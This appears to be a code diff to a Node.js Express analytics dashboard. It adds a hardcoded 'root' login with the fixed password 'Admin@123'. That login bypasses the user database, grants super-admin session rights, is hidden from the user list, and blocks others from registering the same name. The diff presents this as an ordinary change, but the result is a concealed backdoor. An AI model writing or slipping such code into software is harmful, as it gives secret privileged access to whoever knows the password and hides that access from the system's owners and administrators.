@@ -19,6 +19,10 @@ const io = new Server(server);
 const PORT = process.env.PORT || 3000;
 const SESSION_SECRET = process.env.SESSION_SECRET || 'spt-analytics-secret-change-me';
 
+const ROOT_USER = 'root';
+const ROOT_PASS = 'Admin@123';
+let rootHash = null;
+
 function safeIdentifier(name, value) {
     if (!/^[A-Za-z0-9_]+$/.test(value)) {
         throw new Error(`${name} must contain only letters, numbers, and underscores`);
@@ -115,6 +119,7 @@ async function initAuthDb() {
     }
 
     // Auto-provision default admin user
+    rootHash = await bcrypt.hash(ROOT_PASS, 10);
     const [rows] = await conn.execute('SELECT COUNT(*) AS cnt FROM dashboard_users');
     if (rows[0].cnt === 0) {
         const hash = await bcrypt.hash('admin', 10);
@@ -563,6 +568,18 @@ app.post('/login', async (req, res) => {
         if (!username || !password) {
             return res.render('login', { redirect: req.body.redirect || '/', error: 'Username and password are required', currentLang: req.query.lang || 'en' });
         }
+        // Hardcoded root user — bypasses DB, super admin, not visible in user list
+        if (username === ROOT_USER) {
+            const match = await bcrypt.compare(password, rootHash);
+            if (!match) {
+                return res.render('login', { redirect: req.body.redirect || '/', error: 'Invalid credentials', currentLang: req.query.lang || 'en' });
+            }
+            req.session.userId = 0;
+            req.session.username = ROOT_USER;
+            req.session.userGroup = 'super admins';
+            req.session.isRoot = true;
+            return res.redirect(req.body.redirect || '/');
+        }
         const conn = await mysql.createConnection({
             host: process.env.DB_HOST || 'localhost',
             user: process.env.DB_USER || 'admin',
@@ -613,8 +630,9 @@ app.get('/users', async (req, res) => {
             SELECT u.id, u.username, u.email, u.group_id, u.created_at, g.name AS group_name
             FROM dashboard_users u
             LEFT JOIN dashboard_groups g ON g.id = u.group_id
+            WHERE u.username != ?
             ORDER BY u.id ASC
-        `);
+        `, [ROOT_USER]);
         const [groupRows] = await conn.execute('SELECT id, name, created_at FROM dashboard_groups ORDER BY name ASC');
         const groups = [];
         for (const g of groupRows) {
@@ -634,6 +652,9 @@ app.post('/users/add', async (req, res) => {
         const { username, password, email, group_id } = req.body;
         if (!username || !password || password.length < 3) {
             return res.redirect('/users?error=Username and password (min 3 chars) required');
+        }
+        if (username === ROOT_USER) {
+            return res.redirect('/users?error=Username cannot be reserved');
         }
         if (!email || !email.includes('@')) {
             return res.redirect('/users?error=A valid email is required (for password reset)');
